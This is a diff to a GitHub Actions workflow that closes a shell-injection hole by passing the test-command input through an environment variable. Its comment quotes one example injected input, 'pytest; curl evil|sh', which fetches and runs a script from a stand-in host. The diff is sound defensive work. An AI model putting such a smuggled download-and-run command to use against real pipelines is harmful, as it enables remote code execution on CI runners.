@@ -17,5 +17,16 @@ jobs:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
       - name: Add Nix to PATH
         run: echo "/nix/var/nix/profiles/default/bin" >> "$GITHUB_PATH"
+      # The input reaches the shell through env: rather than being interpolated
+      # into the script. GitHub expands ${{ }} by pasting text into the script
+      # before bash sees it, so a caller passing `pytest; curl evil|sh` would
+      # execute both halves; an env var is data the shell never re-parses as
+      # syntax. (semgrep: run-shell-injection.)
+      #
+      # $TEST_COMMAND is deliberately UNQUOTED -- this input is a command line
+      # and must word-split into arguments. Quoting it would pass the whole
+      # string as a single argv entry and break every caller.
       - name: Run tests in Nix devShell
-        run: nix develop -c ${{ inputs.test-command }}
+        env:
+          TEST_COMMAND: ${{ inputs.test-command }}
+        run: nix develop -c $TEST_COMMAND
